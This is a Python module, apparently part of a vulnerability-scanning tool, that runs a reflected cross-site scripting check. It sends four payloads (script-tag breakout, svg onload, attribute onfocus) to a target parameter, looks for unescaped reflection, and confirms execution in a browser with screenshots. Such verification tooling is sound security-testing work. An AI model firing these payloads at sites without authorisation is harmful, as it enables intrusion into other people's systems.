"""Phase 3 Playbook: Cross-Site Scripting (XSS) Verification.

P1: `\"><b>zzTOK</b>`
P2: `'><svg/onload=confirm(zzTOK)>`
P3: `/*-->\"--></style></script><script>confirm(zzTOK)</script>`
P4: `\" autofocus onfocus=confirm(zzTOK) x=\"`

Oracle: raw `<b>zzTOK</b>` or the svg survives UNESCAPED in the SAME context, twice.
Then browser DOM verification: evaluate `document.querySelector('b')` / hook `window.confirm`.
Screenshot + proof artifact. No DOM proof, no CONFIRMED.
"""
from __future__ import annotations

import html
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Callable

from core.finding import HIGH, INFO, Finding
from net.client import HttpClientWrapper, fetch
from verification.doctrine import (
    CONFIRMED,
    CTX_ATTR_Q,
    CTX_ATTR_UQ,
    CTX_JS_STRING,
    CTX_JSON,
    CTX_MARKUP,
    GateResult,
)

logger = logging.getLogger("tsmss.verification.playbooks.xss")


def build_xss_payloads(token: str) -> dict[str, str]:
    """Generate the standard P1-P4 XSS payload bank."""
    return {
        "P1": f'"><b>{token}</b>',
        "P2": f"'><svg/onload=confirm({token})>",
        "P3": f'/*-->"--></style></script><script>confirm("{token}")</script>',
        "P4": f'" autofocus onfocus=confirm("{token}") x="',
    }


def verify_markup_reflection(body: str, token: str, payload_type: str = "P1") -> tuple[bool, str]:
    """Check whether the payload survives unescaped in the markup context."""
    if payload_type == "P1":
        needle = f"<b>{token}</b>"
        if needle in body:
            # Verify it's not entity encoded
            enc_needle = html.escape(needle)
            if enc_needle in body and needle not in body.replace(enc_needle, ""):
                return False, "entity-encoded reflection"
            return True, needle
    elif payload_type == "P2":
        needle = f"<svg/onload=confirm({token})>"
        if needle in body:
            return True, needle
    return False, ""


def evaluate_browser_dom_proof(
    dom_result: dict[str, Any] | None,
    token: str,
) -> tuple[bool, str, str]:
    """Evaluate DOM execution from browser subagent or synthetic fixture.

    Returns (dom_proven, tag_name, screenshot_path).
    """
    if not dom_result:
        return False, "", ""
    element_found = dom_result.get("element_found", False)
    text_content = dom_result.get("text_content", "")
    screenshot = dom_result.get("screenshot_path", "")
    tag = dom_result.get("tag", "b")

    if element_found and (token in text_content or dom_result.get("confirm_hooked", False)):
        return True, tag, screenshot
    return False, "", ""


async def run_xss_playbook(
    target_url: str,
    param: str,
    token: str,
    context: str,
    client: HttpClientWrapper | None = None,
    browser_executor: Callable[[str], dict[str, Any]] | None = None,
) -> GateResult:
    """Execute the full 5-gate XSS verification playbook."""
    result = GateResult()
    result.g1_candidate = True
    result.g2_context = context

    # Kill rule: JS_STRING / JSON without sink cannot be confirmed XSS
    if context in (CTX_JS_STRING, CTX_JSON):
        result.killed = True
        result.kill_reason = f"Reflection in {context} without actionable sink"
        result.confidence = INFO
        return result

    payloads = build_xss_payloads(token)
    p1 = payloads["P1"]

    # Gate 3: Oracle test (unescaped survival twice on clean session)
    survived_count = 0
    raw_response_slice = ""
    for _ in range(2):
        # Build probe URL
        delim = "&" if "?" in target_url else "?"
        probe_url = f"{target_url}{delim}{param}={p1}"
        resp = await fetch(probe_url, client=client)
        ok, match = verify_markup_reflection(resp.body or "", token, "P1")
        if ok:
            survived_count += 1
            idx = (resp.body or "").find(match)
            if idx != -1:
                start = max(0, idx - 200)
                end = min(len(resp.body or ""), idx + len(match) + 200)
                raw_response_slice = (resp.body or "")[start:end]

    if survived_count < 2:
        result.g3_confirm = False
        result.kill_reason = "Payload did not survive unescaped across 2 consecutive runs"
        result.evaluate_confidence()
        return result

    result.g3_confirm = True
    result.oracle_name = "HTML Markup unescaped element survival"
    result.response_slice = raw_response_slice

    # Gate 4: Browser subagent DOM verification & Repro
    # No DOM proof, no CONFIRMED
    if browser_executor:
        probe_url = f"{target_url}{delim}{param}={p1}"
        dom_res = browser_executor(probe_url)
        dom_ok, tag, screenshot = evaluate_browser_dom_proof(dom_res, token)
        if dom_ok:
            result.g4_repro = True
            result.oracle_name = f"DOM element <{tag}> instantiated with token confirmation"
            if screenshot:
                result.artifact_paths.append(screenshot)
        else:
            result.g4_repro = False
            result.kill_reason = "Browser DOM query did not verify element instantiation"
    else:
        # Without browser DOM hook, markup reflection alone cannot achieve G4/G5 CONFIRMED
        result.g4_repro = False

    result.evaluate_confidence()
    return result
